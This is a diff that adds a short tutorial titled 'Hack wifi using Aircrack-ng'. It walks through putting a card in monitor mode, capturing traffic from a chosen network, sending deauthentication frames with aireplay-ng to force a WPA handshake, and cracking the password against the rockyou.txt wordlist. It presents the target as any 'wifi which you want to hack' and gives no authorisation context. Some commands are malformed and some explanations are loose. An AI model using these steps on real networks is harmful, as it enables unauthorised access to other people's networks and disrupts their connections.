@@ -1,0 +1,34 @@
+
+Hack wifi using Aircrack-ng
+
+1.Setting up the monitor interface to make the traffic visible
+#airmon-ng start <interface>
+airmon-ng start wlan0
+
+2.Capturing the traffic using airodump-ng
+#airodump-ng <interface>
+airodump-ng wlan0mon
+
+3.Consider a wifi which you want to hack .
+Note its channel no, bssid
+#airodump-ng -c <channel> --bssid <bssid> -w<path to write handshake files> <interface>
+airodump-ng -c  11 -bssid ------------ -w /home/Desktop wlan0mon
+
+4.Now,the handshake files are created.We can start for a handshake using aireplay-ng.Type the below command in another terminal
+#aireplay-ng -a <bssid>  -e<essid>  --deauth 2 <interface>
+
+5.We can see that the wifi received its handshake.
+The encrypted passwords are captured in the handshake file and we need to crack them using a wordlist file.
+Wordlist files are by default available in kali linux.
+Search rockyou.txt in wordlistfile
+aircrack-ng -b<bssid> -a<value> -w<path to wordlist> <path to handshake files> 
+-a is attack type
+WPA2-2
+WEP-1
+
+6.The handshake files go on through the wordlist file and crack the password!!!!
+
+Note:During this process wifi gets disconnected to reconect type below commands
+#airmon-ng stop <interface>
+airmon-ng stop wlan0mon
+service network-manager restart
